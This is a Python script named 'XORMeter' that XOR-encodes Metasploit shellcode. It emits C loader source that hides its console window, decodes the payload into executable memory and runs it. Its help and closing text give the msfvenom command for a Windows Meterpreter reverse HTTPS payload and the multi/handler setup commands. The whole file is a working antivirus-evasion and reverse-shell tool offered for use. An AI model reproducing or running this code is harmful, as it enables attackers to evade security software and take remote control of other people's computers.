#!/usr/bin/python 
import binascii
import random
import sys
 
def opening_banner():
    ret ='''
__  _____  ____  __  __      _            
\ \/ / _ \|  _ \|  \/  | ___| |_ ___ _ __ 
 \  / | | | |_) | |\/| |/ _ \ __/ _ \ '__|
 /  \ |_| |  _ <| |  | |  __/ ||  __/ |   
/_/\_\___/|_| \_\_|  |_|\___|\__\___|_|
XOR Your Metasploit Payloads...  @vvalien1
'''
    return ret
 
def finish_banner():
    ret ="""
[!] Payload Source code saved as: {0}  

[*] On Your Metasploit Host Run:
--------------------------------
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
set EnableStageEncoding true
set EnableUnicodeEncoding true
set AutoRunScript post/windows/manage/priv_migrate
exploit -j
"""
    return ret
 
def format_output(bytes, xor_key):
    ret = """#define _WIN32_WINNT 0x0500
#include <windows.h>
 
int main(int argc, char **argv) {
   HWND hWnd = GetConsoleWindow();
   ShowWindow(hWnd, SW_HIDE );
   """
    ret += bytes
    ret += """
   char c[sizeof b];
   for (int i = 0; i < sizeof b; i++) {
       c[i] = b[i] ^ """
    ret += "%s" % hex(xor_key)
    ret += """;
   }
   void *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   memcpy(exec, c, sizeof c);
   ((void(*)())exec)();
}
"""
    return ret
 
def open_file(fname):
    o = open(fname, "r")
    ret = o.read()
    o.close()
    return ret
 
def write_file(fname, data):
    o = open(fname, "w")
    o.write(data)
    o.close()
 
def xor_code(scode, xor_key):
    ret = []
    for i in range(len(scode)):
        ret.append(ord(scode[i]) ^ xor_key)
    return ret
 
def to_byte_array(out_scode):
    byte_string = "char b[] = {"
    for i in range(len(out_scode)):
        byte_string += hex(out_scode[i])
        if i < len(out_scode)-1:
            byte_string += ","
    byte_string += "};"
    return byte_string

def extra_help():
    ret = "[*] On Your Metasploit Host Run:\n"
    ret += "--------------------------------\n"
    ret += "msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 \\\n"
    ret += "-e x86/shikata_ga_nai -a x86 --platform windows -f hex > Shellcode.txt\n\n"
    return ret

def omg_halps():
    print("XOR your Shellcode with a random Xor-Key <Number between 0-255>\n")
    print("%s Shellcode.txt CompileMe.c\n" % sys.argv[0])
 
if __name__ == '__main__':
    print(opening_banner())
    if len(sys.argv) == 2:
        if sys.argv[1] == "-h" or sys.argv[1] == "--help":
            print(extra_help())
            sys.exit(0)
    if len(sys.argv) < 3:
        omg_halps()
        sys.exit(0)
    
    xor_key = random.randrange(0,255)
    hexbytes = open_file(sys.argv[1])
    xord_bytes = xor_code(binascii.unhexlify(hexbytes), xor_key)
    bytes = to_byte_array(xord_bytes)
    output_string = format_output(bytes, xor_key)
    write_file(sys.argv[2], output_string)
    closing = finish_banner()
    print(closing.format(sys.argv[2]))
